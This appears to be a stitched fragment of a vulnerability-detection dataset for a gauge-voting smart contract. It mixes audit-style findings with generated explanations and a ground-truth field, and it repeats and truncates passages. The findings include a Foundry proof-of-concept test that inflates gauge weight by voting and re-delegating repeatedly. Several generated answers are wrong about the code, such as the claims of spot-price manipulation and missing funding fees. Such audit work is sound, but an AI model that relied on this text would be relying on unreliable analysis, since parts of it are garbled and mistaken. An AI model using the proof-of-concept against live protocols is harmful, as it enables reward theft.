The user can achieve this by deploying multiple accounts while locking the tokens for different durations, delegating the locked tokens, and extending the lock period to maximize the voting power. When the user wants to retrieve the tokens without losing the voting power, they force their main account to be blocked, which subsequently undelegates the main account with an expired lock. The tokens are then withdrawn and the process can be repeated, effectively creating a loophole that undermines the original purpose of the locked tokens and risking the proper functioning of the protocol.\n\nTo exploit this vulnerability, an attacker would need to have control over two or more accounts that have been used for voting. The attacker would then need to deploy their own contract that can be used to withdraw the funds from the victim's account while still maintaining their voting power. The attacker could then use their own contract to repeatedly withdraw funds from the victim's account, effectively exploiting the vulnerability and potentially causing significant financial harm to the victim.\n\nTo patch this vulnerability, it would be necessary to modify the smart contract code in a way that properly handles the situation where a user wants to retrieve their tokens without losing their voting power. This could include adding additional checks to ensure that the main account is not blocked before the lock period expires, or modifying the logic of the smart contract to prevent users from withdrawing their funds while still maintaining their voting power.

It contains the following loop:\n```solidity\n            for (uint256 i; i < 500; ++i) {\n                if (t > block.timestamp) break;\n                t += WEEK;\n                uint256 d_bias = pt.slope * WEEK;\n                if (pt.bias > d_bias) {\n                    pt.bias -= d_bias;\n                    uint256 d_slope = changes_weight[_gauge_addr][t];\n                    pt.slope -= d_slope;\n                } else {\n                    pt.bias = 0;\n                    pt.slope = 0;\n                }\n                points_weight[_gauge_addr][t] = pt;\n                if (t > block.timestamp) time_weight[_gauge_addr] = t;\n            }\n```\n\nThere are two possible scenarios:\n- `pt.bias > d_bias`\n- `pt.bias <= d_bias`\n\nThe first scenario will always happen naturally, since `pt.bias` will be the total voting power allocated for some point and since slope is a sum of all users' slopes and slopes are calculated in such a way that `<SLOPE> * <TIME_TO_END_OF_STAKING_PERIOD> = <INITIAL_BIAS>`.\n\nHowever, it is possible to artificially change `points_weight[_gauge_addr][t].bias` by calling `change_gauge_weight` (which can be only called by the governance). It important to notice here, that `change_gauge_weight` **doesn't modify** `points_weight[_gauge_addr][t].slope`\n\n`change_gauge_weight` does permit to change the weight to a smaller number than its current value, so it's both perfectly legal and possible that governance does this at some point (it could be changing the weight to `0` or any other value smaller than the current one).\n\nThen, at some point when `_get_weight` is called, we will enter the `else` block because `pt.bias` will be less than the sum of all user's biases (since originally these values were equal, but `pt.bias` was lowered by the governance). It will set `pt.bias` and `pt.slope` to `0`.\n\nAfter some time, the governance may realise that the gauge's weight is `0`, but should be bigger and may change it to some bigger value.\n\nWe will have the situation where `points_weight[_gauge_addr][t].slope = 0` and `points_weight[_gauge_addr][t].bias > 0`.\n\nIf this happens and there is any nonzero `changes_weight[_gauge_addr]` not yet taken into account (for instance in the week after the governance update), then all the functions related to the gauge at `_gauge_addr` will not work.\n\nIt's because, the following functions:\n- `checkpoint_gauge`\n- `gauge_relative_weight_write`\n- `gauge_relative_weight`\n- `_change_gauge_weight`\n- `change_gauge_weight`\n- `vote_for_gauge_weights`\n- `remove_gauge`\n\ncall `_get_weight` at some point.\n\nLet's see what will happen in `_get_weight` when it's called:\n```solidity\n                uint256 d_bias = pt.slope * WEEK;\n                if (pt.bias > d_bias) {\n                    pt.bias -= d_bias;\n                    uint256 d_slope = changes_weight[_gauge_addr][t];\n                    pt.slope -= d_slope;\n                } else {\n```\n\nWe will enter the `if` statement, because `pt.bias` will be `> 0` and `pt.slope` will be `0` (or some small value, if users give their voting power to gauge in the meantime), since it was previously set to `0` in the `else` statement and wasn't touched when gauge's weight was changed by the governance. We will:\n- subtract `d_bias` from `pt.bias` which will succeed\n- attempt to subtract `changes_weight[_gauge_addr][t]` from `d_slope`\n\nHowever, there could be a user (or users) whose voting power allocation finishes at `t` for some `t` not yet handled. It means that `changes_weight[_gauge_addr][t] > 0` (and if `pt.slope` is not `0`, then `changes_weight[_gauge_addr][t]` still may be greater than it). \n\nIf this happens, then the integer underflow will happen in `pt.slope -= d_slope;`. It will now happen in **every** call to `_get_weight` and it won't be possible to recover, because:\n- `vote_for_gauge_weights` will revert\n- `change_gauge_weight` will revert\n\nas they call `_get_weight` internally. So, it won't be possible to modify `pt.slope` and `pt.bias` for any point in time, so the `revert` will always happen for that gauge. It won't even be possible to remove that gauge.\n\nSo, in short, the scenario is as follows:\n1. Users allocate their voting power to a gauge `X`.\n2. Governance at some point decreases the weight of `X`.\n3. Users withdraw their voting power as the time passes, and finally the weight of `X` drops to `0`.\n4. Governance realises this and increases weight of `X` since it wants to incentivise users to provide liquidity in `X`.\n5. Voting power delegation of some user(s) ends some time after that and `_get_weight` attempts to subtract `changes_weight[_gauge_addr][t]` from the current slope (which is either `0` or some small value) and it results in integer underflow.\n6. `X` is unusable and it's impossible to withdraw voting power from (so users cannot give their voting power somewhere else). The weight of `X` cannot be changed anymore and `X` cannot be even removed.\n\n**Note that it is also possible to frontrun the call to `change_gauge_weight` when the weight is set to a lower value** - user with a lot of capital can watch the mempool and if weight is lowered to some value `x`, he can give a voting power of `x` to that gauge. Then, right after weight is changed by the governance, he can withdraw his voting power, leaving the gauge with weight = `0`. Then, governance will manually increase the weight to recover and DoS will happen as described. **So it is only needed that governance decreases gauge's weight at some point**.\n\n## Impact\nAs stated, above the impact is that the entire gauge is useless, voting powers are permanently locked there and its weight is impossible to change, so the impact is high.\n\nIn order for this situation to succeed, governance has to decrease weight of some gauge, but I think it's very likely, because:\n1. `_get_weight` checks that `if (pt.bias > d_bias)` and it handles the opposite situation, so it is anticipated that it may genuinely happen.\n2. It is definitely possible to decrease gauge's weight and it's even possible to zero it out (as in the `remove_gauge`).\n3. The situation where `old_bias` is greater than `old_sum_bias + new_bias` is handled in `vote_for_gauge_weights`, but it may only happen when gauge's weight was decreased by the governance.\n4. The situation where `old_slope.slope` is greater than `old_sum_slope + new_slope.slope` is also handled there, but it may only happen if we enter the `else` statement in `_get_weight`.\n\nSo, it is predicted that gauge's weight may be lowered and the protocol does its best to handle it properly, but as I showed, it fails to do so. Hence, I believe that this finding is of High severity, because although it requires governance to perform some action (decrease weight of some gauge), I believe that it's likely that governance decides to decrease weight, especially that it is anticipated in the code and edge cases are handled there (and they wouldn't be if we assumed that governance would never allowed them to happen).\n\n## Proof of Concept\nPlease run the test below. The test shows slightly simplified situation where governance just sets weight to `0` for `gauge1`, but as I've described above, it suffices that it's just changed to a smaller value and it may drop to `0` naturally as users withdraw their voting power.

The `gauge_relative_weight` function calculates the relative weight of a gauge based on its vote power and the total sum of all gauges.\n2. The `_get_weight` function retrieves the current weight of a gauge, which is determined by the number of votes it has received.\n3.

It contains the following loop:\n```solidity\n            for (uint256 i; i < 500; ++i) {\n                if (t > block.timestamp) break;\n                t += WEEK;\n                uint256 d_bias = pt.slope * WEEK;\n                if (pt.bias > d_bias) {\n                    pt.bias -= d_bias;\n                    uint256 d_slope = changes_weight[_gauge_addr][t];\n                    pt.slope -= d_slope;\n                } else {\n                    pt.bias = 0;\n                    pt.slope = 0;\n                }\n                points_weight[_gauge_addr][t] = pt;\n                if (t > block.timestamp) time_weight[_gauge_addr] = t;\n            }\n```\n\nThere are two possible scenarios:\n- `pt.bias > d_bias`\n- `pt.bias <= d_bias`\n\nThe first scenario will always happen naturally, since `pt.bias` will be the total voting power allocated for some point and since slope is a sum of all users' slopes and slopes are calculated in such a way that `<SLOPE> * <TIME_TO_END_OF_STAKING_PERIOD> = <INITIAL_BIAS>`.\n\nHowever, it is possible to artificially change `points_weight[_gauge_addr][t].bias` by calling `change_gauge_weight` (which can be only called by the governance). It important to notice here, that `change_gauge_weight` **doesn't modify** `points_weight[_gauge_addr][t].slope`\n\n`change_gauge_weight` does permit to change the weight to a smaller number than its current value, so it's both perfectly legal and possible that governance does this at some point (it could be changing the weight to `0` or any other value smaller than the current one).\n\nThen, at some point when `_get_weight` is called, we will enter the `else` block because `pt.bias` will be less than the sum of all user's biases (since originally these values were equal, but `pt.bias` was lowered by the governance). It will set `pt.bias` and `pt.slope` to `0`.\n\nAfter some time, the governance may realise that the gauge's weight is `0`, but should be bigger and may change it to some bigger value.\n\nWe will have the situation where `points_weight[_gauge_addr][t].slope = 0` and `points_weight[_gauge_addr][t].bias > 0`.\n\nIf this happens and there is any nonzero `changes_weight[_gauge_addr]` not yet taken into account (for instance in the week after the governance update), then all the functions related to the gauge at `_gauge_addr` will not work.\n\nIt's because, the following functions:\n- `checkpoint_gauge`\n- `gauge_relative_weight_write`\n- `gauge_relative_weight`\n- `_change_gauge_weight`\n- `change_gauge_weight`\n- `vote_for_gauge_weights`\n- `remove_gauge`\n\ncall `_get_weight` at some point.\n\nLet's see what will happen in `_get_weight` when it's called:\n```solidity\n                uint256 d_bias = pt.slope * WEEK;\n                if (pt.bias > d_bias) {\n                    pt.bias -= d_bias;\n                    uint256 d_slope = changes_weight[_gauge_addr][t];\n                    pt.slope -= d_slope;\n                } else {\n```\n\nWe will enter the `if` statement, because `pt.bias` will be `> 0` and `pt.slope` will be `0` (or some small value, if users give their voting power to gauge in the meantime), since it was previously set to `0` in the `else` statement and wasn't touched when gauge's weight was changed by the governance. We will:\n- subtract `d_bias` from `pt.bias` which will succeed\n- attempt to subtract `changes_weight[_gauge_addr][t]` from `d_slope`\n\nHowever, there could be a user (or users) whose voting power allocation finishes at `t` for some `t` not yet handled. It means that `changes_weight[_gauge_addr][t] > 0` (and if `pt.slope` is not `0`, then `changes_weight[_gauge_addr][t]` still may be greater than it). \n\nIf this happens, then the integer underflow will happen in `pt.slope -= d_slope;`. It will now happen in **every** call to `_get_weight` and it won't be possible to recover, because:\n- `vote_for_gauge_weights` will revert\n- `change_gauge_weight` will revert\n\nas they call `_get_weight` internally. So, it won't be possible to modify `pt.slope` and `pt.bias` for any point in time, so the `revert` will always happen for that gauge. It won't even be possible to remove that gauge.\n\nSo, in short, the scenario is as follows:\n1. Users allocate their voting power to a gauge `X`.\n2. Governance at some point decreases the weight of `X`.\n3. Users withdraw their voting power as the time passes, and finally the weight of `X` drops to `0`.\n4. Governance realises this and increases weight of `X` since it wants to incentivise users to provide liquidity in `X`.\n5. Voting power delegation of some user(s) ends some time after that and `_get_weight` attempts to subtract `changes_weight[_gauge_addr][t]` from the current slope (which is either `0` or some small value) and it results in integer underflow.\n6. `X` is unusable and it's impossible to withdraw voting power from (so users cannot give their voting power somewhere else). The weight of `X` cannot be changed anymore and `X` cannot be even removed.\n\n**Note that it is also possible to frontrun the call to `change_gauge_weight` when the weight is set to a lower value** - user with a lot of capital can watch the mempool and if weight is lowered to some value `x`, he can give a voting power of `x` to that gauge. Then, right after weight is changed by the governance, he can withdraw his voting power, leaving the gauge with weight = `0`. Then, governance will manually increase the weight to recover and DoS will happen as described. **So it is only needed that governance decreases gauge's weight at some point**.\n\n## Impact\nAs stated, above the impact is that the entire gauge is useless, voting powers are permanently locked there and its weight is impossible to change, so the impact is high.\n\nIn order for this situation to succeed, governance has to decrease weight of some gauge, but I think it's very likely, because:\n1. `_get_weight` checks that `if (pt.bias > d_bias)` and it handles the opposite situation, so it is anticipated that it may genuinely happen.\n2. It is definitely possible to decrease gauge's weight and it's even possible to zero it out (as in the `remove_gauge`).\n3. The situation where `old_bias` is greater than `old_sum_bias + new_bias` is handled in `vote_for_gauge_weights`, but it may only happen when gauge's weight was decreased by the governance.\n4. The situation where `old_slope.slope` is greater than `old_sum_slope + new_slope.slope` is also handled there, but it may only happen if we enter the `else` statement in `_get_weight`.\n\nSo, it is predicted that gauge's weight may be lowered and the protocol does its best to handle it properly, but as I showed, it fails to do so. Hence, I believe that this finding is of High severity, because although it requires governance to perform some action (decrease weight of some gauge), I believe that it's likely that governance decides to decrease weight, especially that it is anticipated in the code and edge cases are handled there (and they wouldn't be if we assumed that governance would never allowed them to happen).\n\n## Proof of Concept\nPlease run the test below. The test shows slightly simplified situation where governance just sets weight to `0` for `gauge1`, but as I've described above, it suffices that it's just changed to a smaller value and it may drop to `0` naturally as users withdraw their voting power.

This allows attackers to exploit the timing window by casting their votes just before the end of the window and resetting their votes immediately after, thereby manipulating the system to gain undue benefits.\n\nTo mitigate this issue, it is essential to implement more robust incentive structures that encourage users to participate appropriately and improve the checkpoint system by implementing additional safeguards and recording user status changes more accurately. This can include measures such as:\n\n1. Increasing the size of the checkpoint interval or adding a random delay to prevent attacks from being able to exploit the timing window.\n2. Implementing checks to ensure that users only vote once per checkpoint interval and do not reset their votes after casting them.\n3.

Users can then, for example, claim more tokens in the `LendingLedger` in the market that they inflated the votes on.\n\n## Proof of Concept\n`VotingEscrow` has a delegate mechanism which lets a user delegate the voting power to another user. \nThe `GaugeController` allows voters who locked native in `VotingEscrow` to vote on the weight of a specific gauge.\n\nDue to the fact that users can delegate their voting power in the `VotingEscrow`, they may vote once in a gauge by calling `vote_for_gauge_weights()`, delegate their votes to another address and then call again `vote_for_gauge_weights()` using this other address.\n\nA POC was built in Foundry, add the following test to `GaugeController.t.sol`:\n```solidity\nfunction testDelegateSystemMultipleVoting() public {\n    vm.deal(user1, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user1);\n    gc.change_gauge_weight(user1, 100);\n    vm.stopPrank();\n\n    vm.deal(user2, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user2);\n    gc.change_gauge_weight(user2, 100);\n    vm.stopPrank();\n\n    uint256 v = 10 ether;\n\n    vm.startPrank(user1);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user1, 10_000);\n    vm.stopPrank();\n\n    vm.startPrank(user2);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user2, 10_000);\n    vm.stopPrank();\n\n    uint256 expectedWeight_ = gc.get_gauge_weight(user1);\n\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 50e16);\n\n    uint256 numDelegatedTimes_ = 20;\n\n    for (uint i_; i_ < numDelegatedTimes_; i_++) {\n        address fakeUserI_ = vm.addr(i_ + 27); // random num\n        vm.deal(fakeUserI_, 1);\n\n        vm.prank(fakeUserI_);\n        ve.createLock{value: 1}(1);\n\n        vm.prank(user1);\n        ve.delegate(fakeUserI_);\n\n        vm.prank(fakeUserI_);\n        gc.vote_for_gauge_weights(user1, 10_000);\n    }\n\n    // assert that the weight is approx numDelegatedTimes_ more than expected\n    assertEq(gc.get_gauge_weight(user1), expectedWeight_*(numDelegatedTimes_ + 1) - numDelegatedTimes_*100);\n\n    // relative weight has been increase by a lot, can be increased even more if wished\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 954545454545454545);\n}\n```\n\n## Tools Used\nVscode, Foundry\n\n## Recommended Mitigation Steps\nThe vulnerability comes from the fact that the voting power is fetched from the current timestamp, instead of n blocks in the past, allowing users to vote, delegate, vote again and so on. Thus, the voting power should be fetched from n blocks in the past. \n\nAdditionaly, note that this alone is not enough, because when the current block reaches n blocks in the future, the votes can be replayed again by having delegated to another user n blocks in the past. The exploit in this scenario would become more difficult, but still possible, such as: vote, delegate, wait n blocks, vote and so on. For this reason, a predefined window by the governance could be scheduled, in which users can vote on the weights of a gauge, n blocks in the past from the scheduled window start.\n\n\n## Assessed type\n\nOther",

Additionally, this function does not check whether the gauge is currently being voted on by another user, which could also lead to a DoS attack.\n\nTo mitigate this vulnerability, you should modify the function to ensure that gauges are only added after rewards are queued for the cycle. This can be done by checking the current voting status of the gauge and ensuring that it is not currently being voted on before allowing the user to add a new gauge.

The slope of a vote represents how much each vote is worth in terms of the overall weight of all votes. If a user submits a vote and then another user attempts to submit a conflicting vote before the first vote has been processed, it can cause the second user's vote to be \"front-run\" by the first user, resulting in the second user's vote being worth less than it should be. This is because the slope of the first user's vote will be higher than the second user's vote, making it more likely for the first user's vote to be chosen over the second user's vote.\n\nTo demonstrate how this vulnerability could occur, let's consider an example:\n\nSuppose there are two users, Alice and Bob, who both want to submit votes on a particular proposal. Alice submits her vote before Bob does. The slope of Alice's vote is 100, while the slope of Bob's vote is 50. If Bob submits his vote at exactly the same time as Alice, and if the code processes the two votes in the order they were received (i.e., it doesn't take into account any possible timing issues), then the final weight of Bob's vote will be lower than it should be because it is being \"front-run\" by Alice's vote. In this case, Bob's vote will only have a slope of 50, while it should have a slope of at least 100 in order to be considered equally valid as Alice's vote.\n\nTo mitigate this vulnerability, the smart contract code could be modified to take into account any potential timing issues when processing votes. For example, the code could include logic that checks the time at which each vote is submitted and ensures that it is processed in order of submission time. This would help prevent the \"front-running\" attack described above by ensuring that each user's vote is given its correct weight based on its own individual slope and not on the slopes of any other votes.\n\nOverall, this smart contract code appears to",

Similarly, if the result is less than zero, it will cause an underflow, which can also cause the code to behave unexpectedly.\n\nTo exploit this vulnerability, an attacker could send a transaction with `new_slope` that is calculated to overflow or underflow. This would allow the attacker to manipulate the voting weights and make it impossible for users to reach unanimous decisions.\n\nIn order to mitigate this vulnerability, the smart contract code should be modified to include a check to ensure that `new_bias` and `new_slope` do not exceed the maximum value that can be stored in a variable.

The `voteForGaugeWeights` function allows users to update their slope changes for a gauge by calling it with a new `_user_weight`. This new weight is then used to calculate the slope change for the gauge. However, if a user has already voted for the gauge and has not yet received their vote reward (i.e., their tokens have not been unlocked), they can call this function again with a new ` _user_weight` that is higher than their current weight, effectively increasing their voting power without having to wait for their tokens to be unlocked.\n2. The vulnerability occurs because the contract does not check if the user has already voted for the gauge and has not yet received their vote reward before allowing them to update their slope changes. This means that a user can repeatedly call this function with a new ` _user_weight` without having to wait for their tokens to be unlocked, effectively looting the protocol's voting mechanism by increasing their voting power without contributing their locked tokens.\n3. The contract does not have any safeguards in place to prevent this vulnerability, and it is therefore possible to exploit it by calling this function repeatedly with a higher ` _user_weight` than your current weight.\n\nTherefore, the answer is: Yes, this smart contract code is vulnerable to the \"Looting\" attack.",

Users can then, for example, claim more tokens in the `LendingLedger` in the market that they inflated the votes on.\n\n## Proof of Concept\n`VotingEscrow` has a delegate mechanism which lets a user delegate the voting power to another user. \nThe `GaugeController` allows voters who locked native in `VotingEscrow` to vote on the weight of a specific gauge.\n\nDue to the fact that users can delegate their voting power in the `VotingEscrow`, they may vote once in a gauge by calling `vote_for_gauge_weights()`, delegate their votes to another address and then call again `vote_for_gauge_weights()` using this other address.\n\nA POC was built in Foundry, add the following test to `GaugeController.t.sol`:\n```solidity\nfunction testDelegateSystemMultipleVoting() public {\n    vm.deal(user1, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user1);\n    gc.change_gauge_weight(user1, 100);\n    vm.stopPrank();\n\n    vm.deal(user2, 100 ether);\n    vm.startPrank(gov);\n    gc.add_gauge(user2);\n    gc.change_gauge_weight(user2, 100);\n    vm.stopPrank();\n\n    uint256 v = 10 ether;\n\n    vm.startPrank(user1);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user1, 10_000);\n    vm.stopPrank();\n\n    vm.startPrank(user2);\n    ve.createLock{value: v}(v);\n    gc.vote_for_gauge_weights(user2, 10_000);\n    vm.stopPrank();\n\n    uint256 expectedWeight_ = gc.get_gauge_weight(user1);\n\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 50e16);\n\n    uint256 numDelegatedTimes_ = 20;\n\n    for (uint i_; i_ < numDelegatedTimes_; i_++) {\n        address fakeUserI_ = vm.addr(i_ + 27); // random num\n        vm.deal(fakeUserI_, 1);\n\n        vm.prank(fakeUserI_);\n        ve.createLock{value: 1}(1);\n\n        vm.prank(user1);\n        ve.delegate(fakeUserI_);\n\n        vm.prank(fakeUserI_);\n        gc.vote_for_gauge_weights(user1, 10_000);\n    }\n\n    // assert that the weight is approx numDelegatedTimes_ more than expected\n    assertEq(gc.get_gauge_weight(user1), expectedWeight_*(numDelegatedTimes_ + 1) - numDelegatedTimes_*100);\n\n    // relative weight has been increase by a lot, can be increased even more if wished\n    assertEq(gc.gauge_relative_weight(user1, 7 days), 954545454545454545);\n}\n```\n\n## Tools Used\nVscode, Foundry\n\n## Recommended Mitigation Steps\nThe vulnerability comes from the fact that the voting power is fetched from the current timestamp, instead of n blocks in the past, allowing users to vote, delegate, vote again and so on. Thus, the voting power should be fetched from n blocks in the past. \n\nAdditionaly, note that this alone is not enough, because when the current block reaches n blocks in the future, the votes can be replayed again by having delegated to another user n blocks in the past. The exploit in this scenario would become more difficult, but still possible, such as: vote, delegate, wait n blocks, vote and so on. For this reason, a predefined window by the governance could be scheduled, in which users can vote on the weights of a gauge, n blocks in the past from the scheduled window start.\n\n\n## Assessed type\n\nOther",

Specifically, the line that calculates the new slope for a gauge (`points_weight[_gauge_addr][next_time].slope = Math.max(old_weight_slope + new_slope.slope, old_slope.slope) - old_slope.slope;`) is incorrect. The correct calculation should include the funding fees when calculating the total voting power, but this code does not take into account the funding fees.

In reality, there are often non-zero funding fees associated with using a decentralized finance (DeFi) protocol like Compound, and these fees can have a significant impact on the overall voting power within a system.\n\nTo fix this vulnerability, you would need to modify the code to correctly calculate the total voting power by taking into account the funding fees.

        "gt": "\n# Vulnerability details\n\n`_get_weight` function is used in order to return the total gauge's weight and it also updates past values of the `points_weight` mapping, if `time_weight[_gauge_addr]` is less or equal to the `block.timestamp`. It contains the following loop:\n```solidity\n            for (uint256 i; i < 500; ++i) {\n                if (t > block.timestamp) break;\n                t += WEEK;\n                uint256 d_bias = pt.slope * WEEK;\n                if (pt.bias > d_bias) {\n                    pt.bias -= d_bias;\n                    uint256 d_slope = changes_weight[_gauge_addr][t];\n                    pt.slope -= d_slope;\n                } else {\n                    pt.bias = 0;\n                    pt.slope = 0;\n                }\n                points_weight[_gauge_addr][t] = pt;\n                if (t > block.timestamp) time_weight[_gauge_addr] = t;\n            }\n```\n\nThere are two possible scenarios:\n- `pt.bias > d_bias`\n- `pt.bias <= d_bias`\n\nThe first scenario will always happen naturally, since `pt.bias` will be the total voting power allocated for some point and since slope is a sum of all users' slopes and slopes are calculated in such a way that `<SLOPE> * <TIME_TO_END_OF_STAKING_PERIOD> = <INITIAL_BIAS>`.\n\nHowever, it is possible to artificially change `points_weight[_gauge_addr][t].bias` by calling `change_gauge_weight` (which can be only called by the governance). It important to notice here, that `change_gauge_weight` **doesn't modify** `points_weight[_gauge_addr][t].slope`\n\n`change_gauge_weight` does permit to change the weight to a smaller number than its current value, so it's both perfectly legal and possible that governance does this at some point (it could be changing the weight to `0` or any other value smaller than the current one).\n\nThen, at some point when `_get_weight` is called, we will enter the `else` block because `pt.bias` will be less than the sum of all user's biases (since originally these values were equal, but `pt.bias` was lowered by the governance). It will set `pt.bias` and `pt.slope` to `0`.\n\nAfter some time, the governance may realise that the gauge's weight is `0`, but should be bigger and may change it to some bigger value.\n\nWe will have the situation where `points_weight[_gauge_addr][t].slope = 0` and `points_weight[_gauge_addr][t].bias > 0`.\n\nIf this happens and there is any nonzero `changes_weight[_gauge_addr]` not yet taken into account (for instance in the week after the governance update), then all the functions related to the gauge at `_gauge_addr` will not work.\n\nIt's because, the following functions:\n- `checkpoint_gauge`\n- `gauge_relative_weight_write`\n- `gauge_relative_weight`\n- `_change_gauge_weight`\n- `change_gauge_weight`\n- `vote_for_gauge_weights`\n- `remove_gauge`\n\ncall `_get_weight` at some point.\n\nLet's see what will happen in `_get_weight` when it's called:\n```solidity\n                uint256 d_bias = pt.slope * WEEK;\n                if (pt.bias > d_bias) {\n                    pt.bias -= d_bias;\n                    uint256 d_slope = changes_weight[_gauge_addr][t];\n                    pt.slope -= d_slope;\n                } else {\n```\n\nWe will enter the `if` statement, because `pt.bias` will be `> 0` and `pt.slope` will be `0` (or some small value, if users give their voting power to gauge in the meantime), since it was previously set to `0` in the `else` statement and wasn't touched when gauge's weight was changed by the governance. We will:\n- subtract `d_bias` from `pt.bias` which will succeed\n- attempt to subtract `changes_weight[_gauge_addr][t]` from `d_slope`\n\nHowever, there could be a user (or users) whose voting power allocation finishes at `t` for some `t` not yet handled. It means that `changes_weight[_gauge_addr][t] > 0` (and if `pt.slope` is not `0`, then `changes_weight[_gauge_addr][t]` still may be greater than it). \n\nIf this happens, then the integer underflow will happen in `pt.slope -= d_slope;`. It will now happen in **every** call to `_get_weight` and it won't be possible to recover, because:\n- `vote_for_gauge_weights` will revert\n- `change_gauge_weight` will revert\n\nas they call `_get_weight` internally. So, it won't be possible to modify `pt.slope` and `pt.bias` for any point in time, so the `revert` will always happen for that gauge. It won't even be possible to remove that gauge.\n\nSo, in short, the scenario is as follows:\n1. Users allocate their voting power to a gauge `X`.\n2. Governance at some point decreases the weight of `X`.\n3. Users withdraw their voting power as the time passes, and finally the weight of `X` drops to `0`.\n4. Governance realises this and increases weight of `X` since it wants to incentivise users to provide liquidity in `X`.\n5. Voting power delegation of some user(s) ends some time after that and `_get_weight` attempts to subtract `changes_weight[_gauge_addr][t]` from the current slope (which is either `0` or some small value) and it results in integer underflow.\n6. `X` is unusable and it's impossible to withdraw voting power from (so users cannot give their voting power somewhere else). The weight of `X` cannot be changed anymore and `X` cannot be even removed.\n\n**Note that it is also possible to frontrun the call to `change_gauge_weight` when the weight is set to a lower value** - user with a lot of capital can watch the mempool and if weight is lowered to some value `x`, he can give a voting power of `x` to that gauge. Then, right after weight is changed by the governance, he can withdraw his voting power, leaving the gauge with weight = `0`. Then, governance will manually increase the weight to recover and DoS will happen as described. **So it is only needed that governance decreases gauge's weight at some point**.\n\n## Impact\nAs stated, above the impact is that the entire gauge is useless, voting powers are permanently locked there and its weight is impossible to change, so the impact is high.\n\nIn order for this situation to succeed, governance has to decrease weight of some gauge, but I think it's very likely, because:\n1. `_get_weight` checks that `if (pt.bias > d_bias)` and it handles the opposite situation, so it is anticipated that it may genuinely happen.\n2. It is definitely possible to decrease gauge's weight and it's even possible to zero it out (as in the `remove_gauge`).\n3. The situation where `old_bias` is greater than `old_sum_bias + new_bias` is handled in `vote_for_gauge_weights`, but it may only happen when gauge's weight was decreased by the governance.\n4. The situation where `old_slope.slope` is greater than `old_sum_slope + new_slope.slope` is also handled there, but it may only happen if we enter the `else` statement in `_get_weight`.\n\nSo, it is predicted that gauge's weight may be lowered and the protocol does its best to handle it properly, but as I showed, it fails to do so. Hence, I believe that this finding is of High severity, because although it requires governance to perform some action (decrease weight of some gauge), I believe that it's likely that governance decides to decrease weight, especially that it is anticipated in the code and edge cases are handled there (and they wouldn't be if we assumed that governance would never allowed them to happen).\n\n## Proof of Concept\nPlease run the test below. The test shows slightly simplified situation where governance just sets weight to `0` for `gauge1`, but as I've described above, it suffices that it's just changed to a smaller value and it may drop to `0` naturally as users withdraw their voting power.

The specific type of vulnerability appears to be a \"spot price manipulation\" attack.\n\nHere's why:\n\nThe smart contract code contains a function `_get_weight` that is responsible for determining the weight of deposited tokens in a liquidity pool. This function takes an address `_gauge_addr` as input and returns a `uint256` representing the weight of the deposited tokens at that address.\n\nThe function first retrieves the current timestamp from the blockchain (`t = time_weight[_gauge_addr]`) and checks if it is greater than zero. If it is, the function then proceeds to calculate the weight of the deposited tokens using a for loop. The weight is calculated by iterating over 500 timestamps, starting from the current timestamp (`t`), and subtracting a constant value (`d_bias`) from the `bias` property of each point in the pool.\n\nThe vulnerability lies in the fact that an attacker can manipulate the spot price of the deposited tokens by dripping small amounts of the base token (BASE) into the pool repeatedly, causing the spot price to inflate temporarily. This can be achieved by calling the `_get_weight` function multiple times with different addresses, each representing a different liquidity pool.\n\nFor example, an attacker could create several liquidity pools and deposit small amounts of BASE into each one repeatedly. The `_get_weight` function would then calculate the weight of the deposited tokens in each pool based on the inflated spot price, allowing the attacker to claim higher rewards than they would have if the spot price was not manipulated.\n\nTo mitigate this vulnerability, a recommended approach is to use a Time-Weighted Average Price (TWAP) instead of the spot price while calculating the weight of the deposited tokens. This would provide a more accurate representation of the value of deposited funds and prevent manipulation.",

It contains the following loop:\n```solidity\n            for (uint256 i; i < 500; ++i) {\n                if (t > block.timestamp) break;\n                t += WEEK;\n                uint256 d_bias = pt.slope * WEEK;\n                if (pt.bias > d_bias) {\n                    pt.bias -= d_bias;\n                    uint256 d_slope = changes_weight[_gauge_addr][t];\n                    pt.slope -= d_slope;\n                } else {\n                    pt.bias = 0;\n                    pt.slope = 0;\n                }\n                points_weight[_gauge_addr][t] = pt;\n                if (t > block.timestamp) time_weight[_gauge_addr] = t;\n            }\n```\n\nThere are two possible scenarios:\n- `pt.bias > d_bias`\n- `pt.bias <= d_bias`\n\nThe first scenario will always happen naturally, since `pt.bias` will be the total voting power allocated for some point and since slope is a sum of all users' slopes and slopes are calculated in such a way that `<SLOPE> * <TIME_TO_END_OF_STAKING_PERIOD> = <INITIAL_BIAS>`.\n\nHowever, it is possible to artificially change `points_weight[_gauge_addr][t].bias` by calling `change_gauge_weight` (which can be only called by the governance). It important to notice here, that `change_gauge_weight` **doesn't modify** `points_weight[_gauge_addr][t].slope`\n\n`change_gauge_weight` does permit to change the weight to a smaller number than its current value, so it's both perfectly legal and possible that governance does this at some point (it could be changing the weight to `0` or any other value smaller than the current one).\n\nThen, at some point when `_get_weight` is called, we will enter the `else` block because `pt.bias` will be less than the sum of all user's biases (since originally these values were equal, but `pt.bias` was lowered by the governance). It will set `pt.bias` and `pt.slope` to `0`.\n\nAfter some time, the governance may realise that the gauge's weight is `0`, but should be bigger and may change it to some bigger value.\n\nWe will have the situation where `points_weight[_gauge_addr][t].slope = 0` and `points_weight[_gauge_addr][t].bias > 0`.\n\nIf this happens and there is any nonzero `changes_weight[_gauge_addr]` not yet taken into account (for instance in the week after the governance update), then all the functions related to the gauge at `_gauge_addr` will not work.\n\nIt's because, the following functions:\n- `checkpoint_gauge`\n- `gauge_relative_weight_write`\n- `gauge_relative_weight`\n- `_change_gauge_weight`\n- `change_gauge_weight`\n- `vote_for_gauge_weights`\n- `remove_gauge`\n\ncall `_get_weight` at some point.\n\nLet's see what will happen in `_get_weight` when it's called:\n```solidity\n                uint256 d_bias = pt.slope * WEEK;\n                if (pt.bias > d_bias) {\n                    pt.bias -= d_bias;\n                    uint256 d_slope = changes_weight[_gauge_addr][t];\n                    pt.slope -= d_slope;\n                } else {\n```\n\nWe will enter the `if` 